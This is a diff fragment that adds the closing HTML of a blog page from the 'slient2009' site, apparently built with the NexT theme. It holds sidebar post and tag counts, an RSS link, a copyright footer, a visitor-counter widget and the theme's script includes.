+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">ポスト</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">タグ</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://slient2009.github.io/atom.xml" title="RSS → https:&#x2F;&#x2F;slient2009.github.io&#x2F;atom.xml"><i class="rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+
+
+
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2021 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">slient2009</span>
+</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="合計閲覧者数">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="閲覧合計数">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
